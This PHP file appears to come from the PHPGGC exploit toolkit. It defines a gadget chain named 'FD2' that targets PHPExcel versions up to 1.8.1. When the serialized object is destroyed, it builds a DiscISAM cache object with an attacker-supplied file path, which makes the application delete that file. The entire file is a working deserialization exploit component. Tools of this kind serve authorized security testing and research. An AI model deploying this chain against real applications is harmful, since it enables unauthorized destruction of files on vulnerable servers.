<?php

namespace GadgetChain\PHPExcel;

class FD2 extends \PHPGGC\GadgetChain\FileDelete
{
    public static $version = '<= 1.8.1';
    public static $vector = '__destruct';
    public static $author = 'erwan_lr';
    
    public function generate(array $parameters)
    {
        return new \PHPExcel_CachedObjectStorage_DiscISAM($parameters['remote_file']);
    }
}